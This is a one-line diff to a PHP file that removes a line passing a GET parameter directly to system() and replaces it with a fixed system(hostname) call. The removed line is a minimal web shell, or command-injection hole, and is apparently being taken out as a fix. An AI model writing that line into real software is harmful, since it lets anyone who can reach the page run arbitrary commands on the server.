@@ -1,1 +1,1 @@
-<?php system($_GET[hostname]);?>
+<?php system(hostname);?>
